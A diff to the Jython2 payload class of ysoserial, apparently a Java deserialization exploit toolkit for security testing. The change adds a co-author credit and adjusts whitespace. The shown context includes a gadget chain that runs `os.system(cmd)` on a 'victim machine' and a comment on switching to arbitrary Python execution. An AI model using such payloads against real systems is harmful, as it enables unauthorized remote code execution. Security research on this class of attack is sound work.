@@ -13,13 +13,13 @@ import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 
 /**
- * Credits: Steven Seeley (@steventseeley)
+ * Credits: Steven Seeley (@steventseeley) and Rocco Calvi (@TecR0c)
  * Thanks to Alvaro Munoz (@pwntester) for the InvocationHandler tekniq!
- * 
+ *
  * This version of Jython2 executes python2 code on the victim machine. Note that we are in a Py.eval here
  * so if you want to jump to native python2 code you will need to move to Py.exec and to do that you can use
  * `__import__('code').InteractiveInterpreter().runcode(<python2 code>)` instead.
- * 
+ *
  * java.io.ObjectInputStream.readObject
  *   java.util.PriorityQueue.readObject
  *       java.util.PriorityQueue.heapify
@@ -38,7 +38,7 @@ import ysoserial.payloads.util.PayloadRunner;
 @PayloadTest(skip="non RCE")
 @SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
 @Dependencies({ "org.python:jython-standalone:2.7.3" })
-@Authors({ Authors.SSEELEY })
+@Authors({ Authors.SSEELEY, Authors.RCALVI })
 public class Jython2 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
     public PriorityQueue getObject(String command) throws Exception {
         Class<?> BuiltinFunctionsclazz = Class.forName("org.python.core.BuiltinFunctions");
@@ -52,9 +52,9 @@ public class Jython2 extends PayloadRunner implements ObjectPayload<PriorityQueu
         myargs.put("cmd", new PyString(command));
         PyStringMap locals = new PyStringMap(myargs);
         Object[] queue = new Object[] {
-                new PyString("__import__('os').system(cmd)"), // attack
-                locals,                                       // context
-            };
+            new PyString("__import__('os').system(cmd)"), // attack
+            locals,                                       // context
+        };
         Reflections.setFieldValue(priorityQueue, "queue", queue);
         Reflections.setFieldValue(priorityQueue, "size", 2);
         return priorityQueue;
